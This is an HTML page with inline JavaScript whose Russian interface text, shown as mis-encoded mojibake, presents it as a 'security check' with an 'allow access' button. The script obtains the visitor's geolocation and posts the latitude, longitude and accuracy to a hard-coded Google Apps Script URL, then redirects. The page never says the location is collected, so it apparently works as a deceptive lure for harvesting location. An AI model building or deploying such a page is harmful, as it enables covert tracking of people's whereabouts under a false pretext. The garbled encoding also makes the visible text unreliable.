<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>–ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</title>
  <style>
    /* –°—Ç–∏–ª–∏ –æ—Å—Ç–∞—é—Ç—Å—è –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π */
  </style>
</head>
<body>
  <h2>–ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</h2>
  <button id="consentBtn">–†–∞–∑—Ä–µ—à–∏—Ç—å –¥–æ—Å—Ç—É–ø</button>
  <div class="loader"></div>

  <script>
    const loader = document.querySelector('.loader');
    const consentBtn = document.getElementById('consentBtn');

    // –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –≤ –∫–æ–Ω—Å–æ–ª—å
    function log(message, isError = false) {
      console[isError ? 'error' : 'log'](`[${new Date().toISOString()}] ${message}`);
    }

    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–¥–¥–µ—Ä–∂–∫–∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
    if (!navigator.geolocation) {
      consentBtn.style.display = 'none';
      alert("–í–∞—à –±—Ä–∞—É–∑–µ—Ä –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é!");
      log('–ë—Ä–∞—É–∑–µ—Ä –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é', true);
    }

    function requestGeolocation() {
      log('–ó–∞–ø—É—Å–∫ –∑–∞–ø—Ä–æ—Å–∞ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏...');
      loader.style.display = 'block';
      consentBtn.style.display = 'none';

      // –î–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤: –ø—Ä–æ–≤–µ—Ä–∫–∞ HTTPS
      if (window.location.protocol !== 'https:') {
        const errorMsg = '–û–®–ò–ë–ö–ê: –¢—Ä–µ–±—É–µ—Ç—Å—è HTTPS-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ';
        alert(errorMsg);
        log(errorMsg, true);
        return;
      }

      navigator.geolocation.getCurrentPosition(
        pos => {
          log('–ì–µ–æ–¥–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ –ø–æ–ª—É—á–µ–Ω—ã');
          sendLocation(pos);
        },
        err => {
          log(`–û—à–∏–±–∫–∞ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏: –∫–æ–¥ ${err.code} (${err.message})`, true);
          locationError(err);
        },
        {
          enableHighAccuracy: false,
          timeout: 60000, // –£–≤–µ–ª–∏—á–µ–Ω–Ω—ã–π —Ç–∞–π–º–∞—É—Ç (60 —Å–µ–∫—É–Ω–¥)
          maximumAge: 0
        }
      );
    }

    function sendLocation(pos) {
      const coords = pos.coords;
      log(`–î–∞–Ω–Ω—ã–µ: lat=${coords.latitude}, lon=${coords.longitude}, acc=${coords.accuracy}`);

      const body = new URLSearchParams({
        lat: coords.latitude?.toFixed(6),
        lon: coords.longitude?.toFixed(6),
        acc: coords.accuracy?.toFixed(2)
      });

      fetch('https://script.google.com/macros/s/AKfycbwWJpjAFpOH_u6KlOi9pjoSvnmnZJfS50mgjZpJmuzTZFCPgI9nHNA0clKzAg_QbYmveg/exec', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: body
      })
      .then(response => {
        log(`–°—Ç–∞—Ç—É—Å –æ—Ç–≤–µ—Ç–∞: ${response.status}`);
        if (!response.ok) throw new Error(`HTTP error ${response.status}`);
        return response.json();
      })
      .then(data => {
        log('–û—Ç–≤–µ—Ç —Å–µ—Ä–≤–µ—Ä–∞:', data);
        window.location.href = "/next-page.html";
      })
      .catch(err => {
        log(`–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏: ${err.message}`, true);
        alert('–û—à–∏–±–∫–∞ —Å–≤—è–∑–∏ —Å —Å–µ—Ä–≤–µ—Ä–æ–º');
      })
      .finally(() => {
        loader.style.display = 'none';
        consentBtn.style.display = 'block';
      });
    }

    function locationError(err) {
      const errorMessages = {
        1: "üîí –†–∞–∑—Ä–µ—à–∏—Ç–µ –¥–æ—Å—Ç—É–ø –∫ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞—Ö –±—Ä–∞—É–∑–µ—Ä–∞",
        2: "üìç –ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ:\n‚Ä¢ –ò–Ω—Ç–µ—Ä–Ω–µ—Ç-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ\n‚Ä¢ –í–∫–ª—é—á–µ–Ω –ª–∏ GPS\n‚Ä¢ –†–∞–∑—Ä–µ—à–µ–Ω–∏—è –¥–ª—è –±—Ä–∞—É–∑–µ—Ä–∞",
        3: "‚è≥ –°–ª–∏—à–∫–æ–º –¥–æ–ª–≥–∏–π –æ—Ç–≤–µ—Ç. –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ GPS –∞–∫—Ç–∏–≤–µ–Ω"
      };
      
      alert(errorMessages[err.code] || `–û—à–∏–±–∫–∞: ${err.message}`);
      loader.style.display = 'none';
      consentBtn.style.display = 'block';
      log(`–ü–æ–∫–∞–∑–∞–Ω–æ —Å–æ–æ–±—â–µ–Ω–∏–µ: ${errorMessages[err.code]}`, true);
    }

    consentBtn.addEventListener('click', requestGeolocation);
  </script>
</body>
</html>
